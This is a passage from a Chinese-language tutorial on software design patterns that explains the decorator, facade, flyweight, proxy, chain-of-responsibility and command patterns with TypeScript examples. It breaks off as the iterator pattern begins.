&#123; return this.source.readData(); &#125; save(salaryRecords: string) &#123; this.source.writeData(salaryRecords); &#125;&#125;const getDataSource = ( enabledEncryption: boolean, enabledCompression: boolean) =&gt; &#123; let source: DataSource = new FileDataSource(&quot;data.txt&quot;); if (enabledEncryption) &#123; source = new EncryptionDecorator(source); &#125; if (enabledCompression) &#123; source = new CompressionDecorator(source); &#125; return source;&#125;;// 构造薪资管理器，要求在存储之前进行加密和压缩，在读取之前进行解密和解压缩const salaryLogger = new SalaryManager(getDataSource(true, true));salaryLogger.save(&quot;salary&quot;); // salary 数据已压缩 数据已加密 数据已写入console.log(salaryLogger.load()); // data.txt 数据已解密 数据已解压 适用场景 在无需修改代码的情况下为对象添加额外行为 使用继承对对象进行扩展非常复杂时 js中已经增加了对装饰器语法的支持 优点 无需创建子类即可扩展行为 可以在运行时为对象添加功能 支持多装饰器的组合 符合单一责任原则（可以将一个大类拆分为数个小类） 缺点 嵌套装饰器难以删除其中的某一个 实现一个不受嵌套顺序影响的装饰器比较困难 各层的初始化配置代码比较复杂 Combo 与适配器模式相比，装饰器可以在不修改对象接口的前提下强化对象，另外装饰器支持嵌套 适配器、装饰器与代理 适配器可以为被封装对象提供不同接口 代理模式能为对象提供相同的接口 装饰器能为对象提供强化的接口 组合模式和装饰模式的结构图很相似，因为两者都依赖递归组合来组织无限数量的对象。 装饰类只有一个子组件。 装饰为被封装对象添加了额外的职责，而组合仅对其子节点的结果进行了 “求和”。 可以使用装饰来扩展组合树中特定对象的行为。 装饰可让你更改对象的外表，策略模式则让你能够改变其本质。 装饰和代理 二者相似的结构，但是意图不同。两者都基于组合原则 两者之间的不同之处在于代理通常自行管理其服务对象的生命周期，而装饰的生成则总是由客户端进行控制。 外观设计模式 外观模式是一种结构型设计模式， 能为程序库、 框架或其他复杂类提供一个简单的接口。 假设一下场景：我们需要在项目中使用某个第三方库的众多对象，并按顺序组织他们的初始化工作。这样我们的业务逻辑会和第三方类的实现纠缠在一起形成紧密的耦合，使得维护难度增加 二外观设计模式就是用来处理这种情况的，我们可以为包含许多活动的复杂子系统提供一个简单的接口来降低用户的心智负担。虽然这一接口提供的功能有限，但他更关心用户需要的功能。 例如显示生活中的网购，我们只需要点击下单并付款，购物平台将为我们完成支付处理、调货、包装、纳税、送货等等操作。 外观模式类图如下所示： 外观模式类图 例如我们使用外观设计模式来实现一个第三方视频转换框架，我们需要向客户暴露一个上传接口，其中需要读取视频文件，获得视频文件的源码，得到视频的比特流，随后使用对应的编码器将比特流编码为视频流，最后进行混音后返回。 首先我们来准备实际处理这些操作的类，包含： 视频文件类 MPEG4视频编码类 Ogg视频编码类 源码提取类 比特流读取类 混音类 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class VideoFile &#123; private name: string constructor(name: string) &#123; this.name = name &#125; read(): string &#123; return this.name &#125;&#125;interface Compression &#123; compression(buffer: string): string&#125;class MPEG4Compression implements Compression &#123; compression(buffer: string): string &#123; console.log(&quot;MPEG4编码文件： &quot;, file.read()) return &quot;MPEG4编码文件&quot; &#125;&#125;class OggCompression implements Compression &#123; compression(buffer: string): string &#123; console.log(&quot;OGG编码文件： &quot;, file.read()) return &quot;OGG编码文件&quot; &#125;&#125;// 读取视频源码class CodeFactory &#123; extract(file: VideoFile): string &#123; console.log(&quot;读取视频源码: &quot;, file.read()) return file.read() + &quot;的源码&quot; &#125;&#125;// 读取bit流class BitrateReader &#123; static read(filename: string, source: string): string &#123; console.log(&quot;将名为: &quot;, filename,&quot;,的源码: &quot;, source, &quot;,读取为比特流&quot;) return filename + &quot;的二进制代码&quot; &#125; static convert(buffer: string, compression: Compression): string &#123; let result = compression.compression(buffer) console.log(&quot;将文件: &quot;, buffer, &quot;, 编码为: &quot;, result) return &quot;编码后的&quot; + filename &#125;&#125;// 混音类class AudioMixer &#123; fix(codeFile: string): string &#123; console.log(&quot;对文件: &quot;, codeFile, &quot; 进行混音&quot;) return &quot;混音后的文件&quot; + codeFile &#125;&#125; 随后我们定义一个类来对外暴露一个接口，在接口中实现整个业务逻辑，用户使用该接口即可： 点击查看代码 12345678910111213141516171819202122class VideoConvert &#123; convert(filename: string, format: string): string &#123; let file = new VideoFile(filename) let sourceCode = (new CodeFactory()).extract(file) let compression = null if(format === &quot;mp4&quot;) &#123; compression = new MPEG4Compression() &#125; else &#123; compression = new OggCompression() &#125; let buffer = BitrateReader.read(filename, sourceCode) let res = BitrateReader.convert(buffer, compression) res = (new AudioMixer()).fix(res) return res &#125;&#125;// 使用convert = new VideoConvert()mp4 = convert.convert(&quot;funny-cats-video.ogg&quot;, &quot;mp4&quot;)console.log(mp4) 使用场景 如果你需要一个指向复杂子系统的直接接口，且该接口的功能有限，则可以使用外观模式。 如果需要将子系统组织为多层结构，可以使用外观。创建外观来定义子系统中各层次的入口。可以要求子系统仅使用外观来进行交互，以减少子系统之间的耦合。 例如上述上传视频的功能，我们可以可以拆分为两个层次：音频相关和视频相关。可以为每个层次创建一个外观，然后要求各层的类必须通过这些外观进行交互。 优点 可以让自己的代码独立于复杂子系统。 缺点 外观可能成为与程序中所有类都耦合的上帝对象。 Combo 外观模式在实现时与代理模式较为类似，他们都缓存了一个复杂实体并自行对其进行初始化，但不同之处在于代理与其服务对象遵循同一接口，使得自己和服务对象可以互换。 外观类通常可以转换为单例模式，大部分情况下一个外观对象就够用了 抽象工厂模式与外观模式看起来也很相似，但他们的使用场景对他们进行了区分，如果只需要对用户隐藏子系统的对象创建，则使用抽象工厂模式。 适配器模式只封装一个对象，并运用已有接口。外观模式作用于整个对象子系统上，并为现有对象定义了一个新的接口。 享元模式 享元模式是一种结构型设计模式， 它摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。 考虑如下场景： 由一个FPS游戏，需要设计特殊的粒子系统，希望弹片可以在战场上自由飞翔 那么粒子需要一个自己的类，应该包含方向、速度、颜色、精灵图等信息 希望战争场景尽量真实，因此需要让每颗子弹、导弹、炸弹爆炸时都生成数个粒子 但这样做显然是非常耗费内存的，每个粒子对象都需要在内存中保存自己的信息，包括精灵图。 未使用享元时的类图及内存消耗 而事实上大部分粒子的颜色和精灵图都是相同的，不需要为每个粒子对象都存储一遍。 在面向对象中，我们通常将对象中的状态分为两类： 内在状态——其他对象能读但不能修改 外在状态——能被其他对象充外部修改 而享元模式建议：不在对象中存储外在状态 那么，根据这一建议我们可以将原本的粒子对象分为两个对象： 粒子享元：Particle color sprite 移动粒子：MovingParticle particle coords vector speed 让每个移动中的，颜色，精灵图相同的粒子共用一个粒子对象，这一对象我们称其为享元。 享元下的类图与内存占用 从图中我们可以看出，除了需要上述两个对象外，我们还需要添加以下几个部分： 在容器Game中添加一个数组存储并索引不同的粒子 在容器Game中添加一个数组来存储并索引每个粒子的坐标、方向矢量和速度 为容器Game添加一个方法addParticle来生成不同状态的对象 更优雅的，我们可以构造一个独立的情景类来管理享元对象和外在属性对象，这样容器Game就只需要一个数组就可以了。 由于享元对象需要被多个其他对象复用因此，它最好是不可被修改的，这样就不会出现牵一发而动全身的情况。 另外为了能够方便的访问各种享元，可以创建一个工厂来管理已有的享元对象的缓存池。 下面一起来看看更泛华的享元模式类图： 享元模式类图 享元(Flyweight)类: 包含原始对象中部分能共享的状态，被称为内在状态 情景(Context)类: 包含原始对象中各部相同的状态，与其中的享元对象一起组成原始对象 通常原始对象的行为会被保存在享元对象中，但也可以将其保存在情景对象中 享元工厂(Flyweight Factory)类: 管理享元缓存池，工厂会根据客户提供的参数从缓存池中查找特定享元，有则直接用，无则创建并加入缓存池 示例 下面我们以绘制树形对象为例来使用享元模式设计一系列对象： 我们的树具有一些类型，他们包含一下状态： name color texture 另外，每棵树需要画在不同的地方，因此需要： x y 两个坐标。而使用这些树的容器我们称其为森林Forest 那么我们可以得到这样一幅类图： 享元森林类图 这样一来，我们在渲染这个森林时，就能尽量少的占用内存。 根据这张图我们可以尝试写一个简单的Demo。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118class TreeType &#123; private name: string; private color: string; private texture: string; constructor(name, color, texture) &#123; this.name = name; this.color = color; this.texture = texture; &#125; draw(canvas: string, x: number, y: number) &#123; console.log( `Draw a $&#123;this.name&#125; tree with $&#123;this.color&#125; color &amp; $&#123;this.texture&#125; texture at ($&#123;x&#125;,$&#123;y&#125;) on $&#123;canvas&#125;` ); &#125; getName(): string &#123; return this.name; &#125; getColor(): string &#123; return this.color; &#125; getTexture(): string &#123; return this.texture; &#125;&#125;class Tree &#123; public x: number; public y: number; public type: TreeType; constructor( x: number, y: number, name: string, color: string, texture: string ) &#123; this.x = x; this.y = y; this.type = TreeFactory.getTreeType(name, color, texture); &#125; draw(canvas: string) &#123; this.type.draw(canvas, this.x, this.y); &#125;&#125;class TreeFactory &#123; static types: TreeType[] = []; constructor() &#123; TreeFactory.types = []; &#125; static getTreeType(name: string, color: string, texture: string): TreeType &#123; let res = TreeFactory.types.filter((type: TreeType, index: number) =&gt; &#123; if ( type.getColor() === color &amp;&amp; type.getName() === name &amp;&amp; type.getTexture() === texture ) &#123; return true; &#125; else &#123; return false; &#125; &#125;); if (res !== null &amp;&amp; res.length !== 0) &#123; return res[0]; &#125; else &#123; let newType = new TreeType(name, color, texture); TreeFactory.types.push(newType); return newType; &#125; &#125;&#125;class Forest &#123; public trees: Tree[]; constructor() &#123; this.trees = []; &#125; plantTree(x, y, name, color, texture): Tree &#123; let newTree = new Tree(x, y, name, color, texture); this.trees.push(newTree); return newTree; &#125; draw(canvas: string) &#123; this.trees.forEach((tree: Tree, index: number) =&gt; &#123; tree.draw(canvas); &#125;); &#125;&#125;let forest = new Forest();forest.plantTree(0, 0, &quot;Trio&quot;, &quot;red&quot;, &quot;shadow&quot;);forest.plantTree(0, 1, &quot;Trio&quot;, &quot;yellow&quot;, &quot;solid&quot;);forest.plantTree(0, 2, &quot;Trio&quot;, &quot;blue&quot;, &quot;dash&quot;);forest.plantTree(1, 0, &quot;Trio&quot;, &quot;red&quot;, &quot;shadow&quot;);forest.plantTree(1, 1, &quot;B+&quot;, &quot;green&quot;, &quot;solid&quot;);forest.plantTree(1, 2, &quot;B+&quot;, &quot;green&quot;, &quot;solid&quot;);forest.draw(&quot;Window&quot;);// Draw a Trio tree with red color &amp; shadow texture at (0,0) on Window// Draw a Trio tree with yellow color &amp; solid texture at (0,1) on Window// Draw a Trio tree with blue color &amp; dash texture at (0,2) on Window// Draw a Trio tree with red color &amp; shadow texture at (1,0) on Window// Draw a B+ tree with green color &amp; solid texture at (1,1) on Window// Draw a B+ tree with green color &amp; solid texture at (1,2) on Window 使用场景 程序支持大量对象且没有足够的内存容量时使用 优点 对于具有相似状态的大量对象，可以节约内存 缺点 时间换空间，享元工厂挑选享元的过程需要花费额外的时间 代码复杂，一个实体将被拆分为多个实体 Combo 使用享元模式实现组合模式树的共享叶节点以节省内存。 享元展示了如何生成大量的小型对象，外观模式则展示了如何用一个对象来代表整个子系统。 如果将对象的所有共享状态简化为一个享元对象，那么享元就和单例模式类似了。 但这两个模式有两个根本性的不同： 单例只有一个实体，享元可以有多个，且内在状态不同 单例对象可变，享元不可变 代理模式 代理模式是一种结构型设计模式， 让你能够提供对象的替代品或其占位符。 代理控制着对于原对象的访问， 并允许在将请求提交给对象前后进行一些处理。 考虑如下场景，当我们在使用某个第三方类时： 构造该类对象将消耗大量系统资源 对该对象的使用并不频繁 我们可能会想到对该类实现延迟初始化，即在使用时再进行实例化对象。 我们希望可以将延时初始化的逻辑写入类中来避免冗余代码，但如果第三方库闭源，我们就不得在每个使用该对象的文件中实现延时初始化逻辑。 当然，我们可以使用代理模式解决这一问题。我们可以设计一个代理类，让它与原服务对象接口相同，于是我们就能在代理类中，在实际调用接口之前或之后进行一些操作来实现特殊的功能。 代理设计模式 ServiceInterface服务接口，为代理类以及服务类提供接口规范，但从服务类中抽取接口并非总是可行的，因为需要对服务的所有客户端进行修改，让它们使用接口。备选计划是将代理作为服务类的子类， 这样代理就能继承服务的所有接口了。 Service服务类，实际处理业务逻辑的类 Proxy代理类，包含一个指向服务对象的引用成员变量，完成服务对象进行业务处理前后的工作。通常情况下，代理负责创建服务并对其整个生命周期进行管理。 在一些特殊情况下，客户端会通过构造函数将服务传递给代理。 可以考虑新建一个构建方法来判断客户端可获取的是代理还是实际服务。可以在代理类中创建一个简单的静态方法，也可以创建一个完整的工厂方法。 可以考虑为服务对象实现延迟初始化。 下面我们以一个使用第三方视频工具（例如腾讯视频TencentVideo，TV）库，尝试为其添加延迟初始化和缓存功能的案例，来感受一下代理设计模式。 首先我们需要一个腾讯视频类充当服务类，进行实际的视频业务，随后我们需要实现一个接口，其中包含腾讯视频类中的一些方法。最后实现一个代理类，以腾讯视频对象作为属性，并实现需要代理的方法。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115// 模拟下载队列const downLoadList: Array&lt;Video&gt; = [];// 判断当前视频是否已在下载队列const downLoadExists = (id: number) =&gt; &#123; let judgeList = downLoadList.filter((value: Video) =&gt; &#123; return id === value.id; &#125;); return judgeList.length &gt; 0;&#125;;interface VideoLib &#123; listVideos(); getVideoInfo(id: number); downloadVideo(id: number);&#125;type Video = &#123; id: number; name: string;&#125;;class TVClass implements VideoLib &#123; videoList: Array&lt;Video&gt;; constructor() &#123; this.videoList = [ &#123; id: 1, name: &quot;1.mp4&quot; &#125;, &#123; id: 2, name: &quot;2.mp4&quot; &#125;, ]; &#125; listVideos(): string &#123; return JSON.stringify(this.videoList); &#125; getVideoInfo(id: number): string &#123; return JSON.stringify(this.videoList[id]); &#125; downloadVideo(id: number): void &#123; let video = this.getVideoInfo(id); console.log(&quot;视频正在下载...&quot;); console.log(video); console.log(&quot;下载成功！&quot;); &#125;&#125;class CacheTVClass implements VideoLib &#123; private service: TVClass; private listCache: string; private videoCache: string; private needReset; constructor(service: TVClass) &#123; this.service = service; this.needReset = false; &#125; listVideos() &#123; if (this.listCache === null || this.needReset) &#123; this.listCache = this.service.listVideos(); &#125; return this.listCache; &#125; getVideoInfo(id: number) &#123; if (this.videoCache === null || this.needReset) &#123; this.videoCache = this.service.getVideoInfo(id); &#125; return this.videoCache; &#125; downloadVideo(id: number) &#123; if (downLoadExists(id) || this.needReset) &#123; this.service.downloadVideo(id); &#125; &#125;&#125;// 实际使用服务的类class TVManager &#123; protected service: VideoLib; constructor(service: VideoLib) &#123; this.service = service; &#125; renderVideoPage(id: number) &#123; let info = this.service.getVideoInfo(id); // 渲染视频页面。 console.log(&quot;视频详情页面被渲染！&quot;); &#125; renderListPanel() &#123; let list = this.service.listVideos(); // 渲染视频缩略图列表。 console.log(&quot;视频缩略图列表被渲染！&quot;); &#125; reactOnUserInput(id: number) &#123; console.log(`响应用户点击，并渲染视频 $&#123;id&#125; 的详情页`); this.renderVideoPage(id); this.renderListPanel(); &#125;&#125;const tyService = new TVClass();const tyProxy = new CacheTVClass(tyService);const manager = new TVManager(tyProxy);manager.reactOnUserInput(1);// 响应用户点击，并渲染视频 1 的详情页// 视频详情页面被渲染！// 视频缩略图列表被渲染！ 试用场景 延迟初始化（虚拟代理）。如果有一个偶尔使用的重量级服务对象，一直保持该对象运行会消耗系统资源时，可使用代理模式。 无需在程序启动时就创建该对象，可将对象的初始化延迟到真正有需要的时候。 访问控制 （保护代理）。如果只希望特定客户端使用服务对象，这里的对象可以是操作系统中非常重要的部分，而客户端则是各种已启动的程序 包括恶意程序），此时可使用代理模式。 代理可仅在客户端凭据满足要求时将请求传递给服务对象。 本地执行远程服务（远程代理）。适用于服务对象位于远程服务器上的情形。 在这种情形中，代理通过网络传递客户端请求，负责处理所有与网络相关的复杂细节。 记录日志请求（日志记录代理）。适用于当需要保存对于服务对象的请求历史记录时。 缓存请求结果（缓存代理）。适用于需要缓存客户请求结果并对缓存生命周期进行管理时，特别是当返回结果的体积非常大时。 智能引用。可在没有客户端使用某个重量级对象时立即销毁该对象。 代理会可以将所有获取了指向服务对象或其结果的客户端记录在案。代理可以时不时地遍历各个客户端，检查它们是否仍在运行。如果相应的客户端列表为空，代理就会销毁该服务对象，释放底层系统资源。 代理还可以记录客户端是否修改了服务对象。 其他客户端还可以复用未修改的对象。 优点 可以在客户端毫无察觉的情况下控制服务对象。 如果客户端对服务对象的生命周期没有特殊要求，你可以对生命周期进行管理。 即使服务对象还未准备好或不存在，代理也可以正常工作。 开闭原则。可以在不对服务或客户端做出修改的情况下创建新代理。 缺点 代码可能会变得复杂，因为需要新建许多类。 服务响应可能会延迟。 Combo 适配器模式能为被封装对象提供不同的接口，代理模式能为对象提供相同的接口，装饰模式则能为对象提供加强的接口。 外观模式与代理的相似之处在于它们都缓存了一个复杂实体并自行对其进行初始化。代理与其服务对象遵循同一接口，使得自己和服务对象可以互换，在这一点上它与外观不同。 装饰和代理有着相似的结构，但是其意图却非常不同。这两个模式的构建都基于组合原则，也就是说一个对象应该将部分工作委派给另一个对象。两者之间的不同之处在于代理通常自行管理其服务对象的生命周期，而装饰的生成则总是由客户端进行控制。 行为型模式 行为型模式 (Behavioral Pattern) 是对 在不 同的对象之间划分责任和算法的抽象化 。 行为型模式不仅仅关注类和对象的结构，而 且 重点关注它们之间的相互作用 。 通过行为型模式，可以更加清晰地 划分类与 对象的职责 ，并 研究系统在运行时实例对象 之间的交互 。在系统运行时，对象并不是孤 立的，它们可以通过相互通信与协作完成某 些复杂功能，一个对象在运行时也将影响到 其他对象的运行。 行为型模式分为 类行为型模式 和 对象行为型模式 两种： • 类行为型模式 ：类的行为型模式 使用继承关系在几个类之间分配行为 ，类行为型模式主要通过多态等方式来分配父类与子类的职责。 • 对象行为型模式 ：对象的行为型模式则 使用对象的聚合关联关系来分配行为 ，对象行为型模式主要是通过对象关联等方式来分配两个或多个类的职责。根据“合成复用原则”，系统中要尽量使用关联关系来取代继承关系，因此大部分行为型设计模式都属于对象行为型设计模式 责任链模式(Chain of Responsibility Pattern) 责任链模式是一种行为设计模式， 允许你将请求沿着处理者链进行发送。 收到请求后， 每个处理者均可对请求进行处理， 或将其传递给链上的下个处理者。 我们来看以下场景： 现在有一个在线订购系统 希望限制：有认证的用户才能创建订单 希望限制：有管理员权限的用户拥有所有订单的完全访问权限 接下来有同事提出这个系统存在安全隐患，需要增加一些功能： 需要增加额外的验证步骤来清理请求中的数据 需要添加一个检测步骤来过滤来自同一IP地址的重复错误请求，避免暴力密码破解 需要增加一个缓存查找功能，包含同样数据的重复请求返回缓存中的结果，提高响应速度 但我们还把这一大堆东西加入原本的身份认证机制中后，将得到一大坨复杂、难以复用且难以维护的代码。 这时，责任链模式可以优雅的解决上述问题。 责任链模式会将上述功能，按照单一责任原则，才分为一个一个的处理者，然后将这些处理者按照输入输出一个一个链接起来，每个处理者都有一个成员变量来保存对于下一处理者的引用。这些处理者除了处理请求外，还要负责沿着责任链传递请求。处理者可以决定不再沿着链传递请求， 这可高效地取消所有后续处理步骤。 还有一种更为经典的责任链设计模式，我们在JS中触发事件时，最外层对象Window对象会率先处理事件，最后会一层一层向内存对象传递，最后到达能够处理该事件的对象，则响应该事件，并将结果一层一层冒泡场地到最外层window对象。 所有处理者类均实现同一接口是关键所在。每个具体处理者仅关心下一个包含 execute执行方法的处理者。 这样一来， 就可以在运行时使用不同的处理者来创建链，而无需将相关代码与处理者的具体类进行耦合。 责任链模式类图如下： 责任链模式类图 处理者Handler：为处理者声明接口。 基础处理者BaseHandler：可选类，将所有处理者共同的代码保存在这里，例如确定下一个处理者存在后再将请求传递给它。 具体处理者ConcreteHandler: 实际处理请求的类，接收到请求后举动直接处理或传递给下一个处理者。 下面我们用责任链模式设计一个投喂系统，不同动物会根据请求给出的不同食物各取所需。那么我们需要如下几个部分： 处理者接口 责任链构建方法 请求处理方法 基础处理者抽象类 构建方法：接受一个处理者，保存，然后返回该处理者以实现链式调用 处理方法：处理者非空判断 具体处理者 处理方法：若能处理则返回结果，否则调用父类处理方法 客户端 构建责任链 一个接受处理者的方法 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119/** * 处理者接口 * 包含一个责任链构建方法 * 和一个请求处理方法 */interface Handler&lt;Request = string, Result = string&gt; &#123; setNext(handler: Handler&lt;Request, Result&gt;): Handler&lt;Request, Result&gt;; handle(request: Request): Result | null;&#125;/** * 基础处理者抽象类 */abstract class AbstractHandler implements Handler &#123; private nextHandler: Handler; public setNext(handler: Handler): Handler &#123; this.nextHandler = handler; // 返回处理者，以支持链式调用 // monkey.setNext(squirrel).setNext(dog); return handler; &#125; public handle(request: string): string | null &#123; if (this.nextHandler) &#123; return this.nextHandler.handle(request); &#125; return null; &#125;&#125;/** * 具体处理者 */class MonkeyHandler extends AbstractHandler &#123; public handle(request: string): string | null &#123; if (request === &quot;Banana&quot;) &#123; return `Monkey: I&#x27;ll eat the $&#123;request&#125;.`; &#125; return super.handle(request); &#125;&#125;class SquirrelHandler extends AbstractHandler &#123; public handle(request: string): string | null &#123; if (request === &quot;Nut&quot;) &#123; return `Squirrel: I&#x27;ll eat the $&#123;request&#125;.`; &#125; return super.handle(request); &#125;&#125;class DogHandler extends AbstractHandler &#123; public handle(request: string): string | null &#123; if (request === &quot;MeatBall&quot;) &#123; return `Dog: I&#x27;ll eat the $&#123;request&#125;.`; &#125; return super.handle(request); &#125;&#125;/** * 客户端首先创建责任链. */const monkey = new MonkeyHandler();const squirrel = new SquirrelHandler();const dog = new DogHandler();monkey.setNext(squirrel).setNext(dog);/** * 随后构造客户端调用方法的行为 */function clientCode(handler: Handler) &#123; const foods = [&quot;Nut&quot;, &quot;Banana&quot;, &quot;Cup of coffee&quot;]; for (const food of foods) &#123; console.log(`Client: Who wants a $&#123;food&#125;?`); const result = handler.handle(food); if (result) &#123; console.log(` $&#123;result&#125;`); &#125; else &#123; console.log(` $&#123;food&#125; was left untouched.`); &#125; &#125;&#125;/** * 可以将任意处理者传入调用方法 */console.log(&quot;Chain: Monkey &gt; Squirrel &gt; Dog\\n&quot;);clientCode(monkey);console.log(&quot;&quot;);console.log(&quot;Subchain: Squirrel &gt; Dog\\n&quot;);clientCode(squirrel);/** * Chain: Monkey &gt; Squirrel &gt; Dog * * Client: Who wants a Nut? * Squirrel: I&#x27;ll eat the Nut. * Client: Who wants a Banana? * Monkey: I&#x27;ll eat the Banana. * Client: Who wants a Cup of coffee? * Cup of coffee was left untouched. * * Subchain: Squirrel &gt; Dog * * Client: Who wants a Nut? * Squirrel: I&#x27;ll eat the Nut. * Client: Who wants a Banana? * Banana was left untouched. * Client: Who wants a Cup of coffee? * Cup of coffee was left untouched. */ 试用场景 当程序需要使用不同方式处理不同种类请求，而且请求类型和顺序预先未知时，可以使用责任链模式。 当必须按顺序执行多个处理者时，可以使用该模式。 如果所需处理者及其顺序必须在运行时进行改变，可以使用责任链模式。 优点 允许处理请求顺序。 符合单一责任原则。可对发起操作和执行操作的类进行解耦。 符合开闭原则。可以在不更改现有代码的情况下在程序中新增处理者。 缺点 部分请求可能未被处理。 Combo 责任链模式、命令模式、中介者模式和观察者模式都是用于处理请求发送者和接收者之间的不同连接方式： 责任链按照顺序将请求传递给潜在接收者。直到有一名处理 命令在发送者和接收者之间建立单向连接🔗 中介者消除了发送者和接收者之间的直接连接🔗，强制他们与一个中介对象进行沟通 观察者允许接收者动态地订阅或取消接收请求 责任链通常和组合模式结合使用。在这种情况下，叶组件接收到请求后，可以将请求沿包含全体父组件的链一直传递至对象树的底部。 责任链的管理者可使用命令模式实现。在这种情况下，你可以对由请求代表的同一个上下文对象执行许多不同的操作。另一种是请求自身就是一个命令对象。在这种情况下，可以对由一系列不同上下文连接而成的链执行相同的操作。 责任链和装饰模式的类结构非常相似。两者都依赖递归组合将需要执行的操作传递给一系列对象。但是，两者有几点重要的不同之处。 责任链的管理者可以相互独立地执行一切操作，还可以随时停止传递请求。 各种装饰可以在遵循基本接口的情况下扩展对象的行为。 装饰无法中断请求的传递。 命令模式 命令模式将请求的所有相关信息转化为一个独立对象，这一操作可以允许我们根据不同请求将方法参数化、延迟请求执行或者将其放入队列，且能支持撤销操作。 现在我们有一个构建GUI的业务，他也许包含以下特征： 需要创建一个多个按钮的工具栏 每个按钮对应不同的功能，例如打开、保存、打印 同一功能，例如复制，除了试用按钮完成，还需要支持右键菜单复制与ctrl + C完成 对于第一项需求，我们也许会设计一个简洁的按钮基类Btn，随后设计一些按钮类的子类，来支持不同的功能，例如OpenBtn,SaveBtn。 而对于第三个需求，我们有两个方案： 将复制按钮中的逻辑代码复制一份到菜单类中 让菜单依赖于按钮 前者造成了不小的代码重复，而后者将导致我们的类继承关系混乱。 此时，命令模式可以很好地解决上述问题。 命令模式类图 命令模式将类的行为抽象成了命令类如图所示： 发送者Sender: 负责对请求进行初始化操作，需要包含一个成员变量来存储命令对象的引用，发送者只负责触发命令，而不需要向接收者发送请求。（注意：发送者并不负责创建命令对象，而是通过构造函数获得预先生成的命令）。 命令Command: 命令接口，通常只需要声明一个执行函数。 具体命令ConcreteCommand: 实现请求，并不完成具体的业务逻辑，而是委派给一个业务逻辑对象，请求参数可保存在成员变量中。 接收者Receiver: 实际处理业务逻辑的类，几乎所有对象都能作为接收者。 下面我们来实现一个简单的DEMO来感受一下每个类的作用： 首先为了确保命令的统一性我们需要一个命令接口 其次我们需要一个不带接收者的简单命令，以及一个需要向接收者发送请求的复杂命令 最后我们需要一个实际发送请求的发送者类，他本该向接收者发送请求，但现在他可以通过命令保存参数，定义执行顺序并间接地发送请求。 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// TODO: 命令接口，声明执行方法interface Command &#123; execute(): void;&#125;// TODO: 接收者，处理实际业务逻辑class Receiver &#123; doSomething(a: string): void &#123; console.log(`Receiver: Working on ($&#123;a&#125;.)`); &#125; doSomethingElse(b: string): void &#123; console.log(`Receiver: Working on ($&#123;b&#125;.)`); &#125;&#125;// TODO: 简单命令class SimpleCommand implements Command &#123; private payload: string; constructor(payload: string) &#123; this.payload = payload; &#125; execute(): void &#123; console.log( `SimpleCommand: See, I can do simple things like printing ($&#123;this.payload&#125;)` ); &#125;&#125;// TODO: 复杂命令，需要委派给接收者class ComplexCommand implements Command &#123; private receiver: Receiver; // TODO: 上下文信息，用于保存请求参数 private a: string; private b: string; constructor(receiver: Receiver, a: string, b: string) &#123; this.receiver = receiver; this.a = a; this.b = b; &#125; execute(): void &#123; console.log( &quot;ComplexCommand: Complex stuff should be done by a receiver object.&quot; ); this.receiver.doSomething(this.a); this.receiver.doSomethingElse(this.b); &#125;&#125;// TODO: 与命令相关联，向命令发送请求class Invoke &#123; private onStart: Command; private onFinish: Command; setOnStart(command: Command) &#123; this.onStart = command; &#125; setOnFinish(command: Command) &#123; this.onFinish = command; &#125; private isCommand(object): object is Command &#123; return object.execute !== undefined; &#125; // Invoke类并不需要依赖具体的命令或是接收者，Invoke通过执行命令来调用接收者 doSomethingImportant(): void &#123; console.log( &quot;Invoker: Does anybody want something done before I begin?&quot; ); if (this.isCommand(this.onStart)) &#123; this.onStart.execute(); &#125; console.log(&quot;Invoker: ...doing something really important...&quot;); console.log( &quot;Invoker: Does anybody want something done after I finish?&quot; ); if (this.isCommand(this.onFinish)) &#123; this.onFinish.execute(); &#125; &#125;&#125;const invoker = new Invoke();invoker.setOnStart(new SimpleCommand(&quot;Say Hi!&quot;));const receiver = new Receiver();invoker.setOnFinish( new ComplexCommand(receiver, &quot;Send Message&quot;, &quot;Save report&quot;));invoker.doSomethingImportant();// Invoker: Does anybody want something done before I begin?// SimpleCommand: See, I can do simple things like printing (Say Hi!)// Invoker: ...doing something really important...// Invoker: Does anybody want something done after I finish?// ComplexCommand: Complex stuff should be done by a receiver object.// Receiver: Working on (Send Message.)// Receiver: Working on (Save report.) 试用场景 当需要通过操作来参数化对象时 当需要将操作放入队列中或者计划命令执行时间等等需要序列化命令时 当需要实现命令回滚时 优点 符合单一责任原则。可将触发和执行操作类解耦 符合开闭原则。可以在不修改已有代码的情况下构建新的命令 可以实现撤销和恢复功能 可以实现操作延迟执行 可以将一组简单的命令组合为复杂的命令 缺点 代码可能会因为全新的层次：命令层的引入而变得复杂 Combo 责任链的管理者可使用命令模式实现。在这种情况下，可以对由请求代表的同一个上下文对象执行许多不同的操作。另外一种实现方式，是请求自身就是一个命令对象。这样可以对由一系列不同上下文连接而成的链执行相同的操作。 可以同时使用命令和备忘录模式来实现 “撤销”。在这种情况下，命令用于对目标对象执行各种不同的操作，备忘录用来保存一条命令执行前该对象的状态。 命令和策略模式看上去很像，因为两者都能通过某些行为来参数化对象。但是，它们的意图有非常大的不同： 可以使用命令来将任何操作转换为对象。可以通过转换来延迟操作的执行、将操作放入队列、保存历史命令或者向远程服务发送命令等。 策略通常可用于描述完成某件事的不同方式，让你能够在同一个上下文类中切换算法。 原型模式可用于保存命令的历史记录。 可以将访问者模式视为命令模式的加强版本，其对象可对不同类的多种对象执行操作。 迭代器模式 迭代器模式是一种行为设计模式，能让你在不暴露集合底层表现形式（如列表、栈、队列）的情况下遍历集合中所有的元素 我们考虑以下场景： 在一个系统中我们有一个树形集合容器 需要为这一容器设计一些遍历算法 但可能今天需要用DFS遍历，明天需要用BFS遍历 在这一场景中我们可能需要配合业务不断的增加新的遍历算法，这将造成一下几点问题： 模糊集合“高效存储数据”的主要职责。 